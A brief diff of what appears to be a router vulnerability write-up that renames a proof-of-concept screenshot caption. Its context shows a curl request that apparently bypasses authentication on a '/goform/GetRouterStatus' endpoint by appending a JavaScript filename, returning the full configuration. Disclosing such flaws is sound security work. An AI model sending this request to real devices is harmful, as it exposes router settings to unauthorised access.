@@ -18,4 +18,4 @@ curl http://192.168.0.1/goform/GetRouterStatus?reasy-ui-1.0.3.js
 # HTTP 200 with full configuration JSON
 ```
 
-![Auth bypass response comparison](screenshots/2.png)
+![PoC result](screenshots/2.png)
